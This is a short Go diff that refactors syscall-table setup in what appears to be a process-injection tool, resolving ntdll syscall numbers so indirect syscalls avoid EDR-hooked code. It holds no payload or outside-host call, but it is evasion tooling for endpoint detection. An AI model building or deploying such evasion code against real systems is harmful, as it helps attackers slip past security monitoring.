@@ -49,15 +49,11 @@ func initSyscallPolicy() (err error) {
 		return fmt.Errorf("resolve syscalls: %w", err)
 	}
 
-	syscallPolicyResolved = true
-	syscallPolicySource = ntdllPath
-
 	if !complete {
 		failed := make([]string, 0, len(table.Failed))
 		for name := range table.Failed {
 			failed = append(failed, name)
 		}
-		syscallPolicyFailed = failed
 		// Refuse to run indirect syscalls when the table is incomplete.
 		return fmt.Errorf("syscall table incomplete: %d of %d required syscalls unresolved: %v",
 			len(table.Numbers), len(RequiredSyscalls), strings.Join(failed, ", "))
@@ -65,9 +61,8 @@ func initSyscallPolicy() (err error) {
 
 	// Register the pre-resolved table with the syscall manager so stubs use
 	// the parsed numbers instead of re-scanning the mapped (possibly
-	// EDR-patched) image. The manager and its ssnTable field are defined in
-	// syscall_stubs_windows.go; same package, so direct field access works.
-	getInjectManager().ssnTable = table
+	// EDR-patched) image.
+	getInjectManager().setSSNTable(table)
 	logDebugf("[syscall] policy engaged: %d/%d syscalls resolved from %s",
 		len(table.Numbers), len(RequiredSyscalls), ntdllPath)
 	return nil
